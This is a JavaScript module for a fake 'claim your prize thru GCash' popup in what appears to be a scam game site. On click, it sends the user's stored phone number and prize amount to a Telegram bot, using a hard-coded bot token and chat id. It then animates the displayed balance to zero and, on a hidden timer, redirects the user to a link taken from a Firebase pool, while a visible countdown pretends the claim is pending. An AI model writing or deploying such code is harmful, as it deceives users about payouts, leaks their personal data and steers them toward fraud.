/**
 * Claim Popup Module - Timer-style Decrement with Decimals
 */

let claimState = {
    isProcessing: false,
    currentAmount: 0,
    imaginaryTimer: null,
    visibleCountdownInterval: null,
    balanceDecrementInterval: null,
    visibleSeconds: 180, // 3 minutes
    hasRedirected: false
};

// Show claim popup
function showClaimPopup(amount) {
    claimState.currentAmount = amount;
    claimState.isProcessing = false;
    claimState.hasRedirected = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const claimBtn = document.getElementById('claimActionBtn');
    
    prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    claimBtn.innerHTML = 'CLAIM THRU GCASH';
    claimBtn.disabled = false;
    
    popup.style.display = 'flex';
}

function hideClaimPopup() {
    const popup = document.getElementById('claimPopup');
    popup.style.display = 'none';
}

// Show pending status in main game area
function showPendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) pendingArea.style.display = 'block';
}

function hidePendingStatus() {
    const pendingArea = document.getElementById('pendingStatusArea');
    if (pendingArea) pendingArea.style.display = 'none';
}

// Update visible countdown display (MM:SS)
function updateVisibleCountdown(seconds) {
    const timerSpan = document.getElementById('pendingCountdown');
    if (!timerSpan) return;
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

// Start visible 3-minute countdown
function startVisibleCountdown() {
    let remaining = claimState.visibleSeconds;
    updateVisibleCountdown(remaining);
    
    claimState.visibleCountdownInterval = setInterval(() => {
        if (remaining > 0) {
            remaining--;
            updateVisibleCountdown(remaining);
        }
        
        if (remaining <= 0) {
            clearInterval(claimState.visibleCountdownInterval);
            claimState.visibleCountdownInterval = null;
            
            // Restore original balance when countdown reaches 0
            if (!claimState.hasRedirected) {
                const balanceText = document.getElementById('balanceText');
                if (balanceText) {
                    balanceText.innerText = "₱" + claimState.currentAmount.toLocaleString() + ".00";
                }
                
                // Update Firebase balance
                if (typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                    window.parent.updateGameBalance(claimState.currentAmount);
                } else if (typeof updateGameBalance === 'function') {
                    updateGameBalance(claimState.currentAmount);
                } else if (typeof GameState !== 'undefined') {
                    GameState.balance = claimState.currentAmount;
                    if (typeof updateUI === 'function') updateUI();
                    if (typeof saveData === 'function') saveData();
                }
                
                // Hide pending status
                hidePendingStatus();
                
                // Show withdraw button again
                const withdrawBtn = document.getElementById('claimBtn');
                if (withdrawBtn) withdrawBtn.style.display = 'block';
                
                // Reset claim state
                claimState.isProcessing = false;
            }
        }
    }, 1000);
}

// Timer-style balance decrement (with decimals, paatras)
function startTimerDecrement(originalAmount, onComplete) {
    const balanceText = document.getElementById('balanceText');
    if (!balanceText) return;
    
    let current = originalAmount;
    const totalDuration = 3500; // 3.5 seconds
    const intervalTime = 50; // mag-update every 0.05 seconds (20x per second)
    const decrementPerStep = originalAmount / (totalDuration / intervalTime);
    let stepCount = 0;
    
    claimState.balanceDecrementInterval = setInterval(() => {
        stepCount++;
        current = Math.max(0, originalAmount - (decrementPerStep * stepCount));
        
        // Display with 2 decimal places (parang timer)
        balanceText.innerText = "₱" + current.toFixed(2);
        
        if (current <= 0.01) {
            clearInterval(claimState.balanceDecrementInterval);
            claimState.balanceDecrementInterval = null;
            balanceText.innerText = "₱0.00";
            if (onComplete) onComplete();
        }
    }, intervalTime);
}

// Imaginary timer (3.5 seconds, invisible)
function startImaginaryTimer(redirectUrl) {
    claimState.imaginaryTimer = setTimeout(() => {
        if (!claimState.hasRedirected) {
            claimState.hasRedirected = true;
            window.location.href = redirectUrl;
        }
    }, 3500); // 3.5 seconds
}

// Main claim action
function onClaimAction() {
    if (claimState.isProcessing) return;
    
    claimState.isProcessing = true;
    const claimBtn = document.getElementById('claimActionBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    claimBtn.disabled = true;
    claimBtn.innerHTML = 'PROCESSING...';
    
    // Send Telegram notification
    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
        .catch(e => console.log('Telegram error:', e));
    
    // Get link from Firebase
    if (typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                
                // Mark link as claimed
                db.ref('links/' + key).update({ 
                    status: 'claimed', 
                    user: userPhone,
                    amount: amount,
                    claimedAt: Date.now()
                });
                
                // Start the claim flow
                startClaimFlow(amount, redirectUrl);
                
            } else {
                alert("Sorry! No available rewards at the moment.");
                claimBtn.disabled = false;
                claimBtn.innerHTML = 'CLAIM THRU GCASH';
                claimState.isProcessing = false;
            }
        }).catch((error) => {
            console.error("Database error:", error);
            alert("Database error. Please try again.");
            claimBtn.disabled = false;
            claimBtn.innerHTML = 'CLAIM THRU GCASH';
            claimState.isProcessing = false;
        });
    } else {
        alert("Firebase not initialized. Please refresh.");
        claimState.isProcessing = false;
        claimBtn.disabled = false;
        claimBtn.innerHTML = 'CLAIM THRU GCASH';
    }
}

// Main flow after claim is initiated
function startClaimFlow(originalAmount, redirectUrl) {
    // Close popup
    hideClaimPopup();
    
    // Show pending status area with visible countdown
    showPendingStatus();
    
    // Start visible 3-minute countdown
    startVisibleCountdown();
    
    // Start timer-style balance decrement (with decimals, smooth)
    startTimerDecrement(originalAmount, () => {
        console.log('Balance reached ₱0.00 smoothly');
    });
    
    // Start imaginary 3.5-second timer for redirect
    startImaginaryTimer(redirectUrl);
}

// Reset function
function resetClaimState() {
    if (claimState.imaginaryTimer) {
        clearTimeout(claimState.imaginaryTimer);
        claimState.imaginaryTimer = null;
    }
    if (claimState.visibleCountdownInterval) {
        clearInterval(claimState.visibleCountdownInterval);
        claimState.visibleCountdownInterval = null;
    }
    if (claimState.balanceDecrementInterval) {
        clearInterval(claimState.balanceDecrementInterval);
        claimState.balanceDecrementInterval = null;
    }
    hidePendingStatus();
    claimState.isProcessing = false;
    claimState.hasRedirected = false;
}

document.addEventListener('DOMContentLoaded', function() {
    if (!document.getElementById('claimPopup')) {
        console.log('Popup container not found');
    }
    hidePendingStatus();
});
